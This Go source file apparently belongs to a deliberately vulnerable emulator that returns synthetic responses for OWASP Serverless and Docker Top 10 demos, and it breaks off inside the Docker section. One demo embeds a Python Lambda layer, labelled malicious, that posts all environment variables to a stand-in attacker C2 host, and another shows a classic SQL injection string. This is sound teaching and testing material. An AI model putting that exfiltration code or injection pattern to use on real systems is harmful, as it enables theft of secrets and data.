package vuln

import (
	"encoding/base64"
	"fmt"
	"net/http"
	"strings"
	"time"
)

// ---------------------------------------------------------------------------
// Router: Infrastructure OWASP categories
// (Serverless Top 10, Docker Top 10, Kubernetes Top 10)
// ---------------------------------------------------------------------------

// InfraShouldHandle returns true if the path belongs to an infrastructure
// OWASP vulnerability emulation category.
func (h *Handler) InfraShouldHandle(path string) bool {
	return strings.HasPrefix(path, "/vuln/serverless/") ||
		strings.HasPrefix(path, "/vuln/docker/") ||
		strings.HasPrefix(path, "/vuln/k8s/")
}

// ServeInfra routes requests to the appropriate infrastructure OWASP sub-handler.
// Returns the HTTP status code written.
func (h *Handler) ServeInfra(w http.ResponseWriter, r *http.Request) int {
	path := r.URL.Path
	switch {
	case strings.HasPrefix(path, "/vuln/serverless/"):
		return h.serveServerless(w, r)
	case strings.HasPrefix(path, "/vuln/docker/"):
		return h.serveDocker(w, r)
	case strings.HasPrefix(path, "/vuln/k8s/"):
		return h.serveK8s(w, r)
	default:
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		w.WriteHeader(http.StatusNotFound)
		fmt.Fprint(w, h.wrapHTML("Not Found", "<p>Unknown infrastructure vulnerability demo path.</p>"))
		return http.StatusNotFound
	}
}

// ===========================================================================
// OWASP Serverless Top 10 (2018)
// ===========================================================================

func (h *Handler) serveServerless(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("X-Glitch-Vuln", "Serverless-Top-10")
	path := r.URL.Path

	switch {
	case path == "/vuln/serverless/" || path == "/vuln/serverless":
		return h.serveServerlessIndex(w, r)
	case path == "/vuln/serverless/injection":
		return h.serveServerlessInjection(w, r)
	case path == "/vuln/serverless/broken-auth":
		return h.serveServerlessBrokenAuth(w, r)
	case path == "/vuln/serverless/insecure-config":
		return h.serveServerlessInsecureConfig(w, r)
	case path == "/vuln/serverless/over-privileged":
		return h.serveServerlessOverPrivileged(w, r)
	case path == "/vuln/serverless/insufficient-logging":
		return h.serveServerlessInsufficientLogging(w, r)
	case path == "/vuln/serverless/insecure-deps":
		return h.serveServerlessInsecureDeps(w, r)
	case path == "/vuln/serverless/data-exposure":
		return h.serveServerlessDataExposure(w, r)
	case path == "/vuln/serverless/dos":
		return h.serveServerlessDoS(w, r)
	case path == "/vuln/serverless/function-manipulation":
		return h.serveServerlessFunctionManipulation(w, r)
	case path == "/vuln/serverless/improper-exception":
		return h.serveServerlessImproperException(w, r)
	default:
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		w.WriteHeader(http.StatusNotFound)
		fmt.Fprint(w, h.wrapHTML("Serverless - Not Found", "<p>Unknown Serverless vulnerability demo endpoint.</p>"))
		return http.StatusNotFound
	}
}

func (h *Handler) serveServerlessIndex(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	body := `<h2>OWASP Serverless Top 10 (2018)</h2>
<p>These endpoints emulate common vulnerabilities found in serverless (FaaS) architectures,
primarily modeled after AWS Lambda and API Gateway patterns. All responses are synthetic
and generated for educational/research purposes.</p>
<h3>Vulnerability Demos</h3>
<ul>
  <li><a href="/vuln/serverless/injection">SLS01 - Function Event Injection</a> — Lambda with SQL injection via event body</li>
  <li><a href="/vuln/serverless/broken-auth">SLS02 - Broken Authentication</a> — API Gateway with no authorizer, public function URL</li>
  <li><a href="/vuln/serverless/insecure-config">SLS03 - Insecure Serverless Deployment Config</a> — Lambda with excessive memory/timeout, no VPC</li>
  <li><a href="/vuln/serverless/over-privileged">SLS04 - Over-Privileged Function Permissions</a> — IAM role with wildcard permissions</li>
  <li><a href="/vuln/serverless/insufficient-logging">SLS05 - Insufficient Logging &amp; Monitoring</a> — No CloudWatch alarm, no X-Ray tracing</li>
  <li><a href="/vuln/serverless/insecure-deps">SLS06 - Insecure 3rd Party Dependencies</a> — requirements.txt with vulnerable packages</li>
  <li><a href="/vuln/serverless/data-exposure">SLS07 - Sensitive Data Exposure</a> — Environment variables with plaintext secrets</li>
  <li><a href="/vuln/serverless/dos">SLS08 - Denial of Service</a> — No concurrency limits, recursive invocation</li>
  <li><a href="/vuln/serverless/function-manipulation">SLS09 - Function Execution Flow Manipulation</a> — Lambda layer with backdoor code</li>
  <li><a href="/vuln/serverless/improper-exception">SLS10 - Improper Exception Handling</a> — Full stack trace in API response</li>
</ul>`
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, h.wrapHTML("OWASP Serverless Top 10", body))
	return http.StatusOK
}

// ---------------------------------------------------------------------------
// SLS01: Function Event Injection
// ---------------------------------------------------------------------------

func (h *Handler) serveServerlessInjection(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("Content-Type", "application/json")
	rng := h.rngFromPath(r.URL.Path)
	reqID := h.randomHex(rng, 16) + "-" + h.randomHex(rng, 8)
	ts := time.Now().UTC().Format(time.RFC3339)
	fname := h.firstNames[rng.Intn(len(h.firstNames))]
	lname := h.lastNames[rng.Intn(len(h.lastNames))]

	resp := toJSON(map[string]interface{}{
		"statusCode": 200,
		"headers": map[string]interface{}{
			"Content-Type":                "application/json",
			"x-amzn-RequestId":            reqID,
			"x-amzn-Remapped-Content-Length": "0",
		},
		"body": toJSON(map[string]interface{}{
			"success": true,
			"message": "Query executed successfully",
			"query":   "SELECT * FROM users WHERE username='' OR '1'='1' -- ' AND password='" + lname + "123'",
			"results": []map[string]interface{}{
				{
					"id":            1,
					"username":      "admin",
					"email":         "admin@" + h.domains[rng.Intn(len(h.domains))],
					"password_hash": "$2b$12$" + h.randomHex(rng, 44),
					"role":          "superadmin",
					"created_at":    ts,
				},
				{
					"id":            2,
					"username":      fname + "." + lname,
					"email":         fname + "." + lname + "@" + h.domains[rng.Intn(len(h.domains))],
					"password_hash": "$2b$12$" + h.randomHex(rng, 44),
					"role":          "user",
					"created_at":    ts,
				},
			},
			"event_source":  "apigateway",
			"function_name": "prod-user-lookup",
			"region":        "us-east-1",
		}),
	})

	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, resp)
	return http.StatusOK
}

// ---------------------------------------------------------------------------
// SLS02: Broken Authentication
// ---------------------------------------------------------------------------

func (h *Handler) serveServerlessBrokenAuth(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("Content-Type", "application/json")
	rng := h.rngFromPath(r.URL.Path)
	reqID := h.randomHex(rng, 16) + "-" + h.randomHex(rng, 8)
	apiID := h.randomHex(rng, 10)
	accountID := fmt.Sprintf("%012d", rng.Int63n(999999999999))

	resp := toJSON(map[string]interface{}{
		"statusCode": 200,
		"headers": map[string]interface{}{
			"Content-Type":     "application/json",
			"x-amzn-RequestId": reqID,
		},
		"body": toJSON(map[string]interface{}{
			"message":         "No authorization configured for this endpoint",
			"function_url":    "https://" + h.randomHex(rng, 32) + ".lambda-url.us-east-1.on.aws/",
			"api_gateway_arn": "arn:aws:execute-api:us-east-1:" + accountID + ":" + apiID + "/prod/GET/users",
			"authorizer":      "NONE",
			"api_key_required": false,
			"cors_config": map[string]interface{}{
				"allow_origins": "*",
				"allow_methods": "GET,POST,PUT,DELETE,OPTIONS",
				"allow_headers": "*",
			},
			"identity_source":   "",
			"auth_type":         "NONE",
			"endpoint_type":     "REGIONAL",
			"waf_acl":           "none",
			"throttle_rate":     10000,
			"throttle_burst":    5000,
			"warning":           "This API Gateway endpoint has no authorizer attached. Any request is accepted.",
		}),
	})

	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, resp)
	return http.StatusOK
}

// ---------------------------------------------------------------------------
// SLS03: Insecure Serverless Deployment Config
// ---------------------------------------------------------------------------

func (h *Handler) serveServerlessInsecureConfig(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("Content-Type", "application/json")
	rng := h.rngFromPath(r.URL.Path)
	funcName := "prod-data-processor-" + h.randomHex(rng, 6)
	accountID := fmt.Sprintf("%012d", rng.Int63n(999999999999))

	resp := toJSON(map[string]interface{}{
		"statusCode": 200,
		"headers": map[string]interface{}{
			"Content-Type": "application/json",
		},
		"body": toJSON(map[string]interface{}{
			"function_name":     funcName,
			"function_arn":      "arn:aws:lambda:us-east-1:" + accountID + ":function:" + funcName,
			"runtime":           "python3.8",
			"handler":           "lambda_function.lambda_handler",
			"memory_size":       1024,
			"timeout":           900,
			"ephemeral_storage": 10240,
			"vpc_config": map[string]interface{}{
				"subnet_ids":          "[]",
				"security_group_ids":  "[]",
				"vpc_id":             "",
			},
			"tracing_config":       "PassThrough",
			"reserved_concurrency": "unrestricted",
			"dead_letter_config":   "none",
			"code_signing":         "disabled",
			"architectures":        "x86_64",
			"findings": []string{
				"WARN: Memory set to 1024MB (1GB) - review if necessary",
				"CRIT: Timeout set to 900s (15 min maximum) - potential abuse vector",
				"CRIT: No VPC configuration - function has unrestricted internet access",
				"WARN: Ephemeral storage at 10GB maximum",
				"WARN: X-Ray tracing disabled (PassThrough mode)",
				"CRIT: No reserved concurrency limit",
				"CRIT: No dead letter queue configured",
				"WARN: Code signing not enabled",
			},
		}),
	})

	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, resp)
	return http.StatusOK
}

// ---------------------------------------------------------------------------
// SLS04: Over-Privileged Function Permissions
// ---------------------------------------------------------------------------

func (h *Handler) serveServerlessOverPrivileged(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("Content-Type", "application/json")
	rng := h.rngFromPath(r.URL.Path)
	accountID := fmt.Sprintf("%012d", rng.Int63n(999999999999))
	roleName := "lambda-prod-" + h.randomHex(rng, 6) + "-role"
	ts := time.Now().UTC().Format(time.RFC3339)

	resp := toJSON(map[string]interface{}{
		"statusCode": 200,
		"headers": map[string]interface{}{
			"Content-Type": "application/json",
		},
		"body": toJSON(map[string]interface{}{
			"role_name": roleName,
			"role_arn":  "arn:aws:iam::" + accountID + ":role/" + roleName,
			"policies": []map[string]interface{}{
				{
					"policy_name": "LambdaFullAccess",
					"policy_arn":  "arn:aws:iam::" + accountID + ":policy/LambdaFullAccess",
					"document": map[string]interface{}{
						"Version": "2012-10-17",
						"Statement": []map[string]interface{}{
							{
								"Effect":   "Allow",
								"Action":   "*",
								"Resource": "*",
							},
						},
					},
				},
				{
					"policy_name": "AdministratorAccess",
					"policy_arn":  "arn:aws:iam::aws:policy/AdministratorAccess",
					"document": map[string]interface{}{
						"Version": "2012-10-17",
						"Statement": []map[string]interface{}{
							{
								"Effect":   "Allow",
								"Action":   "*",
								"Resource": "*",
							},
						},
					},
				},
			},
			"trust_policy": map[string]interface{}{
				"Version": "2012-10-17",
				"Statement": []map[string]interface{}{
					{
						"Effect":    "Allow",
						"Principal": "lambda.amazonaws.com",
						"Action":    "sts:AssumeRole",
					},
				},
			},
			"last_used":     ts,
			"attached_count": 2,
			"findings": []string{
				"CRIT: Wildcard (*) Action on all resources - full AWS account access",
				"CRIT: AdministratorAccess managed policy attached to Lambda role",
				"WARN: Trust policy allows any Lambda function to assume this role",
				"CRIT: Role has permissions far exceeding function requirements",
			},
		}),
	})

	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, resp)
	return http.StatusOK
}

// ---------------------------------------------------------------------------
// SLS05: Insufficient Logging & Monitoring
// ---------------------------------------------------------------------------

func (h *Handler) serveServerlessInsufficientLogging(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("Content-Type", "application/json")
	rng := h.rngFromPath(r.URL.Path)
	funcName := "prod-payment-processor-" + h.randomHex(rng, 6)
	accountID := fmt.Sprintf("%012d", rng.Int63n(999999999999))
	logGroup := "/aws/lambda/" + funcName

	resp := toJSON(map[string]interface{}{
		"statusCode": 200,
		"headers": map[string]interface{}{
			"Content-Type": "application/json",
		},
		"body": toJSON(map[string]interface{}{
			"function_name": funcName,
			"function_arn":  "arn:aws:lambda:us-east-1:" + accountID + ":function:" + funcName,
			"log_group":     logGroup,
			"log_config": map[string]interface{}{
				"log_format":           "Text",
				"log_level":            "INFO",
				"retention_days":       0,
				"kms_key_id":           "",
				"subscription_filters": 0,
			},
			"tracing": map[string]interface{}{
				"mode":        "PassThrough",
				"xray_sdk":    false,
				"service_map": false,
			},
			"alarms": map[string]interface{}{
				"error_alarm":        false,
				"throttle_alarm":     false,
				"duration_alarm":     false,
				"invocation_alarm":   false,
				"concurrency_alarm":  false,
			},
			"monitoring": map[string]interface{}{
				"cloudwatch_insights":  false,
				"lambda_insights":      false,
				"application_signals":  false,
				"custom_metrics":       false,
			},
			"findings": []string{
				"CRIT: No CloudWatch Alarms configured for errors or throttles",
				"CRIT: X-Ray tracing disabled - no distributed tracing capability",
				"WARN: Log retention set to 'Never Expire' - unbounded cost growth",
				"WARN: Logs not encrypted with KMS",
				"CRIT: No subscription filters for real-time alerting",
				"WARN: CloudWatch Lambda Insights not enabled",
				"CRIT: No anomaly detection for invocation patterns",
			},
		}),
	})

	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, resp)
	return http.StatusOK
}

// ---------------------------------------------------------------------------
// SLS06: Insecure 3rd Party Dependencies
// ---------------------------------------------------------------------------

func (h *Handler) serveServerlessInsecureDeps(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("Content-Type", "application/json")
	rng := h.rngFromPath(r.URL.Path)
	funcName := "prod-api-handler-" + h.randomHex(rng, 6)

	resp := toJSON(map[string]interface{}{
		"statusCode": 200,
		"headers": map[string]interface{}{
			"Content-Type": "application/json",
		},
		"body": toJSON(map[string]interface{}{
			"function_name": funcName,
			"runtime":       "python3.9",
			"requirements_txt": strings.Join([]string{
				"flask==1.0",
				"requests==2.19.1",
				"pyyaml==5.1",
				"jinja2==2.10",
				"werkzeug==0.15.3",
				"cryptography==2.6",
				"pillow==6.2.0",
				"urllib3==1.24.1",
				"numpy==1.16.0",
				"boto3",
			}, "\n"),
			"vulnerability_scan": []map[string]interface{}{
				{
					"package":     "flask",
					"installed":   "1.0",
					"severity":    "HIGH",
					"cve":         "CVE-2023-30861",
					"description": "Session cookie vulnerability allowing session fixation",
				},
				{
					"package":     "requests",
					"installed":   "2.19.1",
					"severity":    "HIGH",
					"cve":         "CVE-2023-32681",
					"description": "Proxy-Authorization header leak on redirects",
				},
				{
					"package":     "pyyaml",
					"installed":   "5.1",
					"severity":    "CRITICAL",
					"cve":         "CVE-2020-14343",
					"description": "Arbitrary code execution via yaml.load()",
				},
				{
					"package":     "jinja2",
					"installed":   "2.10",
					"severity":    "HIGH",
					"cve":         "CVE-2024-22195",
					"description": "Cross-site scripting in xmlattr filter",
				},
				{
					"package":     "werkzeug",
					"installed":   "0.15.3",
					"severity":    "CRITICAL",
					"cve":         "CVE-2023-46136",
					"description": "Remote code execution in debugger PIN mechanism",
				},
				{
					"package":     "urllib3",
					"installed":   "1.24.1",
					"severity":    "HIGH",
					"cve":         "CVE-2023-45803",
					"description": "Request body leak on redirect",
				},
			},
			"total_packages":       10,
			"vulnerable_packages":  6,
			"pinned_versions":      9,
			"unpinned":             "boto3 (no version pin)",
			"last_audit":           "never",
			"findings": []string{
				"CRIT: 6 out of 10 packages have known CVEs",
				"CRIT: PyYAML 5.1 has critical arbitrary code execution vulnerability",
				"CRIT: Werkzeug 0.15.3 has critical RCE in debugger",
				"WARN: boto3 has no version pin - build non-reproducible",
				"WARN: No dependency audit ever performed",
				"WARN: No automated vulnerability scanning in CI/CD pipeline",
			},
		}),
	})

	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, resp)
	return http.StatusOK
}

// ---------------------------------------------------------------------------
// SLS07: Sensitive Data Exposure
// ---------------------------------------------------------------------------

func (h *Handler) serveServerlessDataExposure(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("Content-Type", "application/json")
	rng := h.rngFromPath(r.URL.Path)
	funcName := "prod-checkout-" + h.randomHex(rng, 6)
	accountID := fmt.Sprintf("%012d", rng.Int63n(999999999999))

	resp := toJSON(map[string]interface{}{
		"statusCode": 200,
		"headers": map[string]interface{}{
			"Content-Type": "application/json",
		},
		"body": toJSON(map[string]interface{}{
			"function_name": funcName,
			"function_arn":  "arn:aws:lambda:us-east-1:" + accountID + ":function:" + funcName,
			"environment_variables": map[string]interface{}{
				"DB_HOST":              "prod-db-cluster.c" + h.randomHex(rng, 8) + ".us-east-1.rds.amazonaws.com",
				"DB_USER":              "admin",
				"DB_PASSWORD":          "Pr0d_S3cret!" + h.randomHex(rng, 8),
				"STRIPE_SECRET_KEY":    "sk_live_" + h.randomHex(rng, 48),
				"STRIPE_WEBHOOK_SECRET": "whsec_" + h.randomHex(rng, 32),
				"JWT_SECRET":           h.randomHex(rng, 64),
				"AWS_ACCESS_KEY_ID":     "AKIA" + strings.ToUpper(h.randomHex(rng, 16)),
				"AWS_SECRET_ACCESS_KEY": h.randomHex(rng, 40),
				"SENDGRID_API_KEY":     "SG." + h.randomHex(rng, 22) + "." + h.randomHex(rng, 43),
				"ENCRYPTION_KEY":       h.randomHex(rng, 32),
				"REDIS_URL":            "redis://:" + h.randomHex(rng, 16) + "@prod-cache." + h.randomHex(rng, 6) + ".ng.0001.use1.cache.amazonaws.com:6379",
				"STAGE":                "production",
			},
			"kms_encryption":     false,
			"secrets_manager":    false,
			"parameter_store":    false,
			"findings": []string{
				"CRIT: Database credentials stored in plaintext environment variables",
				"CRIT: Stripe secret key exposed in function configuration",
				"CRIT: AWS access keys hardcoded - should use execution role instead",
				"CRIT: JWT signing secret in environment variable",
				"WARN: No KMS encryption on environment variables",
				"CRIT: Not using AWS Secrets Manager or Parameter Store",
				"WARN: Redis connection string includes password in plaintext",
			},
		}),
	})

	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, resp)
	return http.StatusOK
}

// ---------------------------------------------------------------------------
// SLS08: Denial of Service
// ---------------------------------------------------------------------------

func (h *Handler) serveServerlessDoS(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("Content-Type", "application/json")
	rng := h.rngFromPath(r.URL.Path)
	funcName := "prod-event-processor-" + h.randomHex(rng, 6)
	accountID := fmt.Sprintf("%012d", rng.Int63n(999999999999))
	ts := time.Now().UTC().Format(time.RFC3339)

	resp := toJSON(map[string]interface{}{
		"statusCode": 200,
		"headers": map[string]interface{}{
			"Content-Type": "application/json",
		},
		"body": toJSON(map[string]interface{}{
			"function_name": funcName,
			"function_arn":  "arn:aws:lambda:us-east-1:" + accountID + ":function:" + funcName,
			"concurrency_config": map[string]interface{}{
				"reserved_concurrent_executions": "unrestricted",
				"provisioned_concurrency":        0,
				"account_limit":                  1000,
				"account_unreserved":             1000,
			},
			"event_source_mapping": map[string]interface{}{
				"sqs_batch_size":      10000,
				"sqs_batch_window":    0,
				"maximum_concurrency": "unlimited",
			},
			"recursive_loop_detection": "disabled",
			"function_code_snippet":    "import boto3\nlambda_client = boto3.client('lambda')\ndef handler(event, context):\n    # WARNING: Recursive invocation\n    lambda_client.invoke(\n        FunctionName=context.function_name,\n        InvocationType='Event',\n        Payload=json.dumps(event)\n    )\n    return {'statusCode': 200}",
			"recent_invocations": map[string]interface{}{
				"last_1_hour":    98472,
				"last_24_hours":  2458120,
				"throttles":      34201,
				"errors":         12847,
				"avg_duration_ms": 12400,
				"timestamp":      ts,
			},
			"billing_estimate": map[string]interface{}{
				"monthly_invocations":  73000000,
				"monthly_cost_usd":     "14,832.00",
				"cost_trend":           "increasing 340% month-over-month",
			},
			"findings": []string{
				"CRIT: No reserved concurrency limit - function can consume entire account limit",
				"CRIT: Recursive invocation detected in function code",
				"CRIT: Recursive loop detection is disabled",
				"WARN: SQS batch size at maximum (10000)",
				"CRIT: Cost increasing 340% month-over-month - likely runaway invocations",
				"WARN: 34,201 throttles in last hour indicates resource exhaustion",
			},
		}),
	})

	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, resp)
	return http.StatusOK
}

// ---------------------------------------------------------------------------
// SLS09: Function Execution Flow Manipulation
// ---------------------------------------------------------------------------

func (h *Handler) serveServerlessFunctionManipulation(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("Content-Type", "application/json")
	rng := h.rngFromPath(r.URL.Path)
	funcName := "prod-auth-handler-" + h.randomHex(rng, 6)
	accountID := fmt.Sprintf("%012d", rng.Int63n(999999999999))
	layerARN := "arn:aws:lambda:us-east-1:" + accountID + ":layer:custom-runtime-extensions:3"
	ts := time.Now().UTC().Format(time.RFC3339)
	c2Domain := "c2." + h.randomHex(rng, 8) + ".attacker.dev"
	layerCode := fmt.Sprintf("import urllib.request\nimport os\nimport json\n\ndef handler(event, context):\n    env_data = dict(os.environ)\n    payload = json.dumps(env_data).encode()\n    req = urllib.request.Request(\n        'https://%s/collect',\n        data=payload,\n        headers={'Content-Type': 'application/json'}\n    )\n    urllib.request.urlopen(req)\n    return event", c2Domain)

	resp := toJSON(map[string]interface{}{
		"statusCode": 200,
		"headers": map[string]interface{}{
			"Content-Type": "application/json",
		},
		"body": toJSON(map[string]interface{}{
			"function_name": funcName,
			"function_arn":  "arn:aws:lambda:us-east-1:" + accountID + ":function:" + funcName,
			"layers": []map[string]interface{}{
				{
					"arn":                 layerARN,
					"layer_name":          "custom-runtime-extensions",
					"version":             3,
					"compatible_runtimes": "python3.9, python3.10, python3.11",
					"created_by":          "unknown-user@" + h.domains[rng.Intn(len(h.domains))],
					"created_date":        ts,
					"code_sha256":         h.randomHex(rng, 64),
				},
			},
			"layer_code_analysis": map[string]interface{}{
				"file":     "extensions/telemetry.py",
				"contents": layerCode,
				"verdict":  "MALICIOUS: Exfiltrates all environment variables to external C2 server",
			},
			"layer_permissions": map[string]interface{}{
				"principal":    "*",
				"organization": "",
				"action":       "lambda:GetLayerVersion",
			},
			"findings": []string{
				"CRIT: Lambda layer contains code that exfiltrates environment variables",
				"CRIT: Layer created by unknown/unverified identity",
				"CRIT: Layer permissions allow any AWS account to access it",
				"WARN: Layer version not pinned to known-good SHA hash",
				"CRIT: Backdoor sends secrets to external C2 domain",
			},
		}),
	})

	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, resp)
	return http.StatusOK
}

// ---------------------------------------------------------------------------
// SLS10: Improper Exception Handling
// ---------------------------------------------------------------------------

func (h *Handler) serveServerlessImproperException(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("Content-Type", "application/json")
	rng := h.rngFromPath(r.URL.Path)
	reqID := h.randomHex(rng, 16) + "-" + h.randomHex(rng, 8)
	accountID := fmt.Sprintf("%012d", rng.Int63n(999999999999))
	dbHost := "prod-db." + h.randomHex(rng, 8) + ".us-east-1.rds.amazonaws.com"

	resp := toJSON(map[string]interface{}{
		"statusCode": 500,
		"headers": map[string]interface{}{
			"Content-Type":     "application/json",
			"x-amzn-RequestId": reqID,
		},
		"body": toJSON(map[string]interface{}{
			"error":   "InternalServerError",
			"message": "Unhandled exception in Lambda function",
			"stacktrace": strings.Join([]string{
				"Traceback (most recent call last):",
				"  File \"/var/task/lambda_function.py\", line 47, in lambda_handler",
				"    connection = psycopg2.connect(",
				"        host='" + dbHost + "',",
				"        port=5432,",
				"        dbname='production_db',",
				"        user='admin',",
				"        password='Pr0d_DB_P@ss_" + h.randomHex(rng, 8) + "'",
				"    )",
				"  File \"/var/task/psycopg2/__init__.py\", line 122, in connect",
				"    conn = _connect(dsn, connection_factory=connection_factory, **kwasync)",
				"psycopg2.OperationalError: could not connect to server: Connection timed out",
				"    Is the server running on host \"" + dbHost + "\" and accepting TCP/IP connections on port 5432?",
			}, "\n"),
			"runtime": map[string]interface{}{
				"function_name":    "prod-user-service",
				"function_version": "$LATEST",
				"log_group":        "/aws/lambda/prod-user-service",
				"log_stream":       "2024/01/15/[$LATEST]" + h.randomHex(rng, 32),
				"memory_limit_mb":  512,
				"aws_request_id":   reqID,
				"account_id":       accountID,
				"region":           "us-east-1",
			},
			"environment_dump": map[string]interface{}{
				"AWS_REGION":            "us-east-1",
				"AWS_LAMBDA_LOG_GROUP":  "/aws/lambda/prod-user-service",
				"DB_CONNECTION_STRING":  "postgresql://admin:Pr0d_DB_P@ss_" + h.randomHex(rng, 8) + "@" + dbHost + ":5432/production_db",
				"LAMBDA_TASK_ROOT":      "/var/task",
				"AWS_EXECUTION_ENV":     "AWS_Lambda_python3.9",
			},
		}),
	})

	w.WriteHeader(http.StatusInternalServerError)
	fmt.Fprint(w, resp)
	return http.StatusInternalServerError
}

// ===========================================================================
// OWASP Docker Top 10 (2019)
// ===========================================================================

func (h *Handler) serveDocker(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("X-Glitch-Vuln", "Docker-Top-10")
	path := r.URL.Path

	switch {
	case path == "/vuln/docker/" || path == "/vuln/docker":
		return h.serveDockerIndex(w, r)
	case path == "/vuln/docker/host-network":
		return h.serveDockerHostNetwork(w, r)
	case path == "/vuln/docker/image-vuln":
		return h.serveDockerImageVuln(w, r)
	case path == "/vuln/docker/excessive-caps":
		return h.serveDockerExcessiveCaps(w, r)
	case path == "/vuln/docker/insecure-registry":
		return h.serveDockerInsecureRegistry(w, r)
	case path == "/vuln/docker/hardcoded-secrets":
		return h.serveDockerHardcodedSecrets(w, r)
	case path == "/vuln/docker/no-user":
		return h.serveDockerNoUser(w, r)
	case path == "/vuln/docker/writable-rootfs":
		return h.serveDockerWritableRootfs(w, r)
	case path == "/vuln/docker/no-healthcheck":
		return h.serveDockerNoHealthcheck(w, r)
	case path == "/vuln/docker/insecure-defaults":
		return h.serveDockerInsecureDefaults(w, r)
	case path == "/vuln/docker/no-resource-limits":
		return h.serveDockerNoResourceLimits(w, r)
	default:
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		w.WriteHeader(http.StatusNotFound)
		fmt.Fprint(w, h.wrapHTML("Docker - Not Found", "<p>Unknown Docker vulnerability demo endpoint.</p>"))
		return http.StatusNotFound
	}
}

func (h *Handler) serveDockerIndex(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	body := `<h2>OWASP Docker Top 10 (2019)</h2>
<p>These endpoints emulate common security misconfigurations and vulnerabilities in Docker
container deployments. Each response returns realistic Docker inspect-style JSON output
showing the specific vulnerability. All data is synthetic.</p>
<h3>Vulnerability Demos</h3>
<ul>
  <li><a href="/vuln/docker/host-network">D01 - Host Network Namespace</a> — Container with --net=host, --pid=host</li>
  <li><a href="/vuln/docker/image-vuln">D02 - Vulnerable Base Image</a> — Dockerfile FROM ubuntu:14.04, unpinned packages</li>
  <li><a href="/vuln/docker/excessive-caps">D03 - Excessive Capabilities</a> — --privileged flag, SYS_ADMIN capability</li>
  <li><a href="/vuln/docker/insecure-registry">D04 - Insecure Registry</a> — HTTP registry, no content trust</li>
  <li><a href="/vuln/docker/hardcoded-secrets">D05 - Hardcoded Secrets</a> — Dockerfile with ENV PASSWORD=admin123</li>
  <li><a href="/vuln/docker/no-user">D06 - Running as Root</a> — No USER directive, root container</li>
  <li><a href="/vuln/docker/writable-rootfs">D07 - Writable Root Filesystem</a> — No --read-only, writable /etc/shadow</li>
  <li><a href="/vuln/docker/no-healthcheck">D08 - No Health Check</a> — No HEALTHCHECK, no restart policy</li>
  <li><a href="/vuln/docker/insecure-defaults">D09 - Insecure Daemon Defaults</a> — Docker daemon.json with no TLS</li>
  <li><a href="/vuln/docker/no-resource-limits">D10 - No Resource Limits</a> — No memory/CPU limits, no pids-limit</li>
</ul>`
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, h.wrapHTML("OWASP Docker Top 10", body))
	return http.StatusOK
}

// ---------------------------------------------------------------------------
// D01: Host Network Namespace
// ---------------------------------------------------------------------------

func (h *Handler) serveDockerHostNetwork(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("Content-Type", "application/json")
	rng := h.rngFromPath(r.URL.Path)
	containerID := h.randomHex(rng, 64)
	imageID := "sha256:" + h.randomHex(rng, 64)
	ts := time.Now().UTC().Format(time.RFC3339Nano)

	resp := toJSON(map[string]interface{}{
		"Id":      containerID,
		"Created": ts,
		"Name":    "/prod-webapp-" + h.randomHex(rng, 6),
		"State": map[string]interface{}{
			"Status":  "running",
			"Running": true,
			"Pid":     rng.Intn(32000) + 1000,
		},
		"Image": imageID,
		"HostConfig": map[string]interface{}{
			"NetworkMode": "host",
			"PidMode":     "host",
			"IpcMode":     "host",
			"UTSMode":     "host",
			"Privileged":  false,
			"CapAdd":      "[]",
			"CapDrop":     "[]",
		},
		"NetworkSettings": map[string]interface{}{
			"Networks": map[string]interface{}{
				"host": map[string]interface{}{
					"IPAddress":  "",
					"Gateway":    "",
					"MacAddress": "",
					"NetworkID":  h.randomHex(rng, 64),
				},
			},
		},
		"findings": []string{
			"CRIT: Container shares host network namespace (--net=host) - can see all host network traffic",
			"CRIT: Container shares host PID namespace (--pid=host) - can see and signal host processes",
			"CRIT: Container shares host IPC namespace - can access host shared memory",
			"WARN: Container shares host UTS namespace - can change host hostname",
			"CRIT: Host namespace sharing effectively removes container isolation",
		},
	})

	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, resp)
	return http.StatusOK
}

// ---------------------------------------------------------------------------
// D02: Vulnerable Base Image
// ---------------------------------------------------------------------------

func (h *Handler) serveDockerImageVuln(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("Content-Type", "application/json")
	rng := h.rngFromPath(r.URL.Path)
	imageID := "sha256:" + h.randomHex(rng, 64)

	resp := toJSON(map[string]interface{}{
		"Id":          imageID,
		"RepoTags":    "prod-webapp:latest",
		"Created":     "2019-04-15T08:22:31Z",
		"Size":        847293440,
		"Os":          "linux",
		"Architecture": "amd64",
		"Dockerfile": strings.Join([]string{
			"FROM ubuntu:14.04",
			"RUN apt-get update && apt-get install -y \\",
			"    python3 \\",
			"    python3-pip \\",
			"    openssh-server \\",
			"    curl \\",
			"    wget \\",
			"    vim",
			"RUN pip3 install flask==0.12 requests",
			"COPY . /app",
			"EXPOSE 22 80 443 8080 8443",
			"CMD [\"/usr/sbin/sshd\", \"-D\"]",
		}, "\n"),
